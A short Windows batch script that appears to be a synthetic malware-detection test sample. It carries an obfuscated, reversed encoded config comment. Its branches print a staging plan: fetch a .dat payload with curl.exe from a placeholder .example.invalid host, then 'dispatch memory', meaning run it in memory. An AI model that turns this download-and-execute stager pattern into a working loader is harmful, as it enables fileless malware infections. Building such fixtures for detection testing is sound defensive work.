@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|reverse
rem HUNTRESS-MATERIAL:=YXPxw3c0VGcz1TYjFXdpJXZfJXZt9GdlxCZpNHchR3Yo9Vbl12bylHfhRWYwRXZy1zY1JHbuUGelx3c0F2Zl91YvVnb01TM8dmchBHa9YWYu91b1RHfuVGe09Fbh52Z1F2Zl1jbv5WZ8NWYtBXYpdmbflGZ9MWYtBXYpdmbtETN4QjZ0YWN4YDf1JHb9gGd0B3c68yLxUDO0YGNmVDO24SZ4FWbwxWZukmb2FGbpR2L5QTMxIjNwkjLkFGd
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set item0=v=1^|steps=acquire_remote,dispatch_memory^|adapte
set item1=r=curl.exe^|stage_count=1^|graph=fan_out^|next_lan
set item2=guage=none^|campaign_id=campaign-1584f4f586^|url=
set item3=https://1584f4f586.example.invalid/94112609.dat
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
set "neutral_string_join=846ef96c"
set "item9=!item0!!item1!!item2!!item3!"
echo(!item9!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo curl.exe GET https://1584f4f586.example.invalid/94112609.dat then dispatch memory
exit /b 0
